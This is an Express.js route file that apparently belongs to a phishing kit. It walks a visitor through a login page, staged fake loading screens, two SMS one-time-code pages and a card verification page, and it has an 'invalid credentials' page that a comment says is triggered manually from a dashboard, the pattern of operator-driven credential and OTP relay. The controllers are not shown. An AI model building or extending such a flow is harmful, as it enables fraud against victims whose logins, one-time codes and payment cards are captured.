const express = require('express');
const router = express.Router();
const pageController = require('../controllers/page.controller');
const { ROUTES } = require('../config/constants');

// Step 1: Login Page
router.get(ROUTES.LOGIN, (req, res) => pageController.renderLogin(req, res));

// Step 2: Loading 1 (after login -> redirects to SMS 1)
router.get(ROUTES.LOADING_1, (req, res) => pageController.renderLoading1(req, res));

// Step 3: SMS OTP Page 1
router.get(ROUTES.SMS_1, (req, res) => pageController.renderSms1(req, res));

// Step 4: Loading 3 (after SMS 1 -> redirects to SMS 2)
router.get(ROUTES.LOADING_3, (req, res) => pageController.renderLoading3(req, res));

// Step 5: SMS OTP Page 2
router.get(ROUTES.SMS_2, (req, res) => pageController.renderSms2(req, res));

// Step 6: Loading 2 (after SMS 2 -> redirects to Card Verification)
router.get(ROUTES.LOADING_2, (req, res) => pageController.renderLoading2(req, res));

// Step 7: Card Verification Page
router.get(ROUTES.CARD_VERIFICATION, (req, res) => pageController.renderCard(req, res));

// Step 8: Loading 4 (after Card -> redirects to Done page)
router.get(ROUTES.LOADING_4, (req, res) => pageController.renderLoading4(req, res));

// Step 9: Done / Success page (everything is good)
router.get(ROUTES.DONE, (req, res) => pageController.renderDone(req, res));

// Invalid credentials page (manually triggered from dashboard)
router.get(ROUTES.INVALID_CREDENTIALS, (req, res) => pageController.renderInvalidCredentials(req, res));

// Unified dynamic loading route
router.get('/loading', (req, res) => pageController.renderDynamicLoading(req, res));

module.exports = router;
